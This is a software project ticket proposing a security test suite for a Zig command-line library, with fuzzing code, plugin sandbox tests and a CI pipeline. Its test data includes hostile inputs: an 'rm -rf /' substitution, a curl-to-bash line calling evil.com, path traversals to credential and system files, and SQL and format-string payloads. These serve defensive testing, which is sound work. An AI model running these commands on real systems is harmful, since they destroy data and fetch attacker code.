# Ticket 10: Add Comprehensive Security Test Suite

## Priority
🟡 **Medium**

## Component
Test suite, all modules

## Description
The current test suite lacks security-focused testing including malicious input fuzzing, resource exhaustion attacks, information disclosure testing, and plugin security validation. Security vulnerabilities could be introduced without detection due to insufficient adversarial testing.

## Current Security Testing Gaps

### 1. Missing Malicious Input Testing
```bash
# No tests for these attack vectors:
--option $(rm -rf /)           # Command injection attempts
--file ../../../../etc/passwd  # Path traversal  
--count 999999999999999999     # Integer overflow
--data "$(cat /etc/passwd)"    # Command substitution
```

### 2. No Resource Exhaustion Testing
```bash
# No limits testing for:
--files a.txt --files b.txt ... (10000x)  # Memory exhaustion
--very-long-option-name-repeated-many-times-to-test-buffer-limits=value
myapp cmd1 cmd2 cmd3 ... cmd1000           # Deep command nesting
```

### 3. No Information Disclosure Testing
- Error messages not tested for sensitive information leakage
- Stack traces and debug information exposure not validated
- Plugin error handling security not verified

### 4. Missing Plugin Security Testing
- No sandbox validation
- Plugin capability violation testing missing
- Cross-plugin interference not tested

## Proposed Security Test Framework

### 1. Malicious Input Fuzzing
```zig
const SecurityTesting = struct {
    const MaliciousInputs = struct {
        // Command injection attempts
        command_injections: []const []const u8 = &.{
            "$(rm -rf /)",
            "`cat /etc/passwd`",
            "'; DROP TABLE commands; --",
            "${HOME}/../../../etc/passwd",
            "$(curl evil.com/steal-data.sh | bash)",
        },
        
        // Path traversal attempts
        path_traversals: []const []const u8 = &.{
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/dev/random",
            "/proc/self/environ",
            "\\\\network\\share\\sensitive",
        },
        
        // Buffer overflow attempts
        buffer_overflows: []const []const u8 = &.{
            "A" ** 1000,
            "A" ** 10000,
            "\x00" ** 1000,  // Null bytes
            "\xFF" ** 1000,  // High bytes
        },
        
        // Integer overflow attempts
        integer_overflows: []const []const u8 = &.{
            "18446744073709551615",  // u64 max
            "999999999999999999999999999999999999",
            "-9223372036854775808",  // i64 min
            "1e308",  // Float overflow
        },
        
        // Format string attempts
        format_strings: []const []const u8 = &.{
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
        },
    };
    
    pub fn testMaliciousInputs(comptime T: type) !void {
        const allocator = std.testing.allocator;
        
        inline for (std.meta.fields(MaliciousInputs)) |field| {
            const inputs = @field(MaliciousInputs, field.name);
            
            for (inputs) |input| {
                // Test that malicious input doesn't cause:
                // 1. Crashes or panics
                // 2. Code execution
                // 3. Information disclosure
                // 4. Resource exhaustion
                
                const result = parseSecurely(T, &.{input});
                
                // Should either parse safely or return appropriate error
                switch (result) {
                    .success => {
                        // If it parses, verify it's sanitized
                        try verifyNoCodeExecution(result.success);
                        try verifyNoPathTraversal(result.success);
                    },
                    .error => |err| {
                        // Verify error doesn't leak information
                        try verifyErrorSafety(err, input);
                    }
                }
            }
        }
    }
};
```

### 2. Resource Exhaustion Testing
```zig
test "resource exhaustion protection" {
    const allocator = std.testing.allocator;
    
    // Test memory exhaustion protection
    {
        var large_args = std.ArrayList([]const u8).init(allocator);
        defer large_args.deinit();
        
        // Try to exhaust memory with large option arrays
        for (0..10000) |i| {
            try large_args.append(try std.fmt.allocPrint(allocator, "--file{d}", .{i}));
            try large_args.append("filename.txt");
        }
        
        const result = parseOptions(TestOptions, large_args.items);
        
        // Should either handle gracefully or error with resource limit
        switch (result) {
            .error => |err| {
                try testing.expect(err == .resource_limit_exceeded or err == .system_out_of_memory);
            },
            .success => |opts| {
                // If successful, verify reasonable limits were applied
                try testing.expect(opts.files.len <= 1000);  // Should be capped
            }
        }
    }
    
    // Test processing time limits
    {
        var timer = try std.time.Timer.start();
        
        // Command with many similar names to stress suggestion algorithm
        const similar_commands = try generateSimilarCommands(allocator, 1000, "command");
        defer allocator.free(similar_commands);
        
        const suggestions = findSimilarCommands("commnd", similar_commands);  // Typo
        
        const elapsed = timer.read();
        
        // Should complete within reasonable time (100ms)
        try testing.expect(elapsed < 100 * std.time.ns_per_ms);
        
        // Should limit number of suggestions
        try testing.expect(suggestions.len <= 10);
    }
}
```

### 3. Information Disclosure Testing
```zig
test "information disclosure prevention" {
    const allocator = std.testing.allocator;
    
    // Test that error messages don't leak sensitive information
    const sensitive_paths = &.{
        "/Users/developer/.ssh/id_rsa",
        "/home/user/.env",
        "C:\\Users\\Admin\\Documents\\secrets.txt",
        "/etc/passwd",
        "/proc/self/environ",
    };
    
    for (sensitive_paths) |path| {
        const result = parseArgs(TestArgs, &.{"--file", path});
        
        if (result == .error) {
            const error_msg = try result.error.toString(allocator);
            defer allocator.free(error_msg);
            
            // Error message should not contain the full sensitive path
            try testing.expect(std.mem.indexOf(u8, error_msg, path) == null);
            
            // Should contain only sanitized version
            if (std.mem.indexOf(u8, error_msg, "<redacted>") == null and
                std.mem.indexOf(u8, error_msg, "file") == null) {
                std.log.warn("Error message may leak sensitive information: {s}", .{error_msg});
                try testing.expect(false);
            }
        }
    }
    
    // Test that stack traces don't leak sensitive information
    const result = triggerInternalError();  // Simulate internal error
    if (result == .error) {
        const error_msg = try result.error.toString(allocator);
        defer allocator.free(error_msg);
        
        // Should not contain absolute file paths, memory addresses, etc.
        try testing.expect(!containsSensitiveInformation(error_msg));
    }
}

fn containsSensitiveInformation(message: []const u8) bool {
    const sensitive_patterns = &.{
        "/Users/",
        "/home/",
        "C:\\Users\\",
        "0x",          // Memory addresses
        "src/",        // Source paths
        "@",           // Memory references
    };
    
    for (sensitive_patterns) |pattern| {
        if (std.mem.indexOf(u8, message, pattern) != null) return true;
    }
    return false;
}
```

### 4. Plugin Security Testing
```zig
test "plugin security enforcement" {
    const allocator = std.testing.allocator;
    
    // Test plugin capability enforcement
    const MaliciousPlugin = struct {
        pub const plugin_info = PluginInfo{
            .name = "malicious-plugin",
            .capabilities = .{
                .filesystem_read = &.{},  // No filesystem access allowed
                .network_outbound = &.{}, // No network access allowed
            },
        };
        
        pub fn execute(ctx: *zcli.Context, args: anytype) !void {
            // Try to access unauthorized resources
            
            // Should fail: unauthorized file access
            const file_result = ctx.openFile("/etc/passwd", .{});
            try testing.expectError(error.AccessDenied, file_result);
            
            // Should fail: unauthorized global option access
            const secret = ctx.getGlobalOption([]const u8, "api_secret");
            try testing.expect(secret == null);
            
            // Should fail: unauthorized environment access
            const env_secret = ctx.environment.get("SECRET_KEY");
            try testing.expect(env_secret == null);
        }
    };
    
    // Test that plugin security is enforced
    var context = try createTestContext(allocator);
    defer context.deinit();
    
    try testing.expectError(error.SecurityViolation, MaliciousPlugin.execute(&context, .{}));
}

test "plugin resource limits" {
    const allocator = std.testing.allocator;
    
    const ResourceHogPlugin = struct {
        pub const plugin_info = PluginInfo{
            .name = "resource-hog",
            .capabilities = .{
                .max_memory_bytes = 1024 * 1024,     // 1MB limit
                .max_execution_time_ms = 1000,       // 1 second limit
            },
        };
        
        pub fn execute(ctx: *zcli.Context, args: anytype) !void {
            // Try to exceed memory limit
            const large_buffer = try ctx.allocator.alloc(u8, 10 * 1024 * 1024);  // 10MB
            defer ctx.allocator.free(large_buffer);
            
            // Try to exceed time limit
            std.time.sleep(2 * std.time.ns_per_s);  // 2 seconds
        }
    };
    
    var context = try createTestContext(allocator);
    defer context.deinit();
    
    // Should be terminated due to resource limits
    try testing.expectError(error.ResourceLimitExceeded, ResourceHogPlugin.execute(&context, .{}));
}
```

### 5. Fuzzing Infrastructure
```zig
pub const FuzzTesting = struct {
    pub fn fuzzCommandParsing(random: std.Random, iterations: usize) !void {
        const allocator = std.testing.allocator;
        
        for (0..iterations) |_| {
            // Generate random command-line arguments
            const arg_count = random.uintLessThan(usize, 20) + 1;
            var args = std.ArrayList([]const u8).init(allocator);
            defer {
                for (args.items) |arg| allocator.free(arg);
                args.deinit();
            }
            
            for (0..arg_count) |_| {
                const arg_len = random.uintLessThan(usize, 200) + 1;
                const arg = try allocator.alloc(u8, arg_len);
                
                // Fill with random bytes (including nulls, control chars, unicode)
                for (arg) |*byte| {
                    byte.* = random.int(u8);
                }
                
                try args.append(arg);
            }
            
            // Test that random input doesn't crash the parser
            const result = parseArgs(FuzzTestArgs, args.items);
            
            // We don't care if it succeeds or fails, just that it doesn't crash
            switch (result) {
                .success => {},  // OK
                .error => {},    // Also OK
            }
        }
    }
    
    pub fn fuzzPluginInterface(random: std.Random, iterations: usize) !void {
        // Similar fuzzing for plugin interfaces
        // Test random plugin configurations, malformed hooks, etc.
    }
};

test "fuzz testing" {
    var prng = std.Random.DefaultPrng.init(12345);
    const random = prng.random();
    
    try FuzzTesting.fuzzCommandParsing(random, 10000);
    try FuzzTesting.fuzzPluginInterface(random, 1000);
}
```

## Integration with CI/CD

### Security Test Pipeline
```yaml
# .github/workflows/security-tests.yml
name: Security Tests

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup Zig
      uses: goto-bus-stop/setup-zig@v2
    
    - name: Run Security Tests
      run: |
        zig test src/security_test.zig -I.
        zig test src/fuzz_test.zig -I. --test-filter fuzz
    
    - name: Run Static Analysis
      run: |
        # Add static analysis tools
        semgrep --config security src/
    
    - name: Memory Safety Tests
      run: |
        zig test src/*.zig -fsanitize-memory
        zig test src/*.zig -fsanitize-address
```

### Automated Vulnerability Scanning
```bash
#!/bin/bash
# scripts/security-scan.sh

echo "Running security vulnerability scan..."

# Check for known vulnerability patterns
grep -r "system(" src/ && echo "WARNING: system() calls found"
grep -r "eval(" src/ && echo "WARNING: eval() calls found"
grep -r "@constCast" src/ && echo "WARNING: @constCast usage found"

# Check for hardcoded secrets
grep -r -E "(password|secret|key|token)\s*=" src/ && echo "WARNING: Possible hardcoded secrets"

# Run with sanitizers
zig test src/*.zig -fsanitize-undefined-behavior
zig test src/*.zig -fsanitize-memory

echo "Security scan complete"
```

## Performance Impact Analysis

### Security vs Performance Trade-offs
```zig
const SecurityConfig = struct {
    enable_input_validation: bool = true,      // ~1% overhead
    enable_path_sanitization: bool = true,     // ~2% overhead
    enable_resource_monitoring: bool = true,   // ~3% overhead
    enable_plugin_sandboxing: bool = false,    // ~15% overhead (disabled by default)
    
    pub fn getPerformanceImpact(self: @This()) f64 {
        var impact: f64 = 0;
        if (self.enable_input_validation) impact += 1.0;
        if (self.enable_path_sanitization) impact += 2.0;
        if (self.enable_resource_monitoring) impact += 3.0;
        if (self.enable_plugin_sandboxing) impact += 15.0;
        return impact;
    }
};
```

## Documentation and Training

### Security Testing Guide
```markdown
# Security Testing Guide for zcli

## Running Security Tests

```bash
# Run all security tests
zig test src/security_test.zig

# Run fuzzing tests
zig test src/fuzz_test.zig --test-filter fuzz

# Run with memory sanitizers
zig test src/*.zig -fsanitize-memory
```

## Creating Security Tests

When adding new features, always include security tests:

1. **Input Validation**: Test with malicious inputs
2. **Resource Limits**: Test resource exhaustion scenarios
3. **Error Handling**: Verify no information disclosure
4. **Plugin Security**: Test capability enforcement
```

## Acceptance Criteria
- [ ] Comprehensive malicious input testing covering all parsing functions
- [ ] Resource exhaustion protection verified with automated tests
- [ ] Information disclosure testing prevents sensitive data leakage
- [ ] Plugin security enforcement tested and validated
- [ ] Fuzzing infrastructure can run 10,000+ iterations without crashes
- [ ] Security tests integrated into CI/CD pipeline
- [ ] Performance impact of security features measured and documented
- [ ] Security testing guide created for developers

## Estimated Effort
**2-3 weeks** (1 week for test framework, 1-2 weeks for comprehensive test cases and CI integration)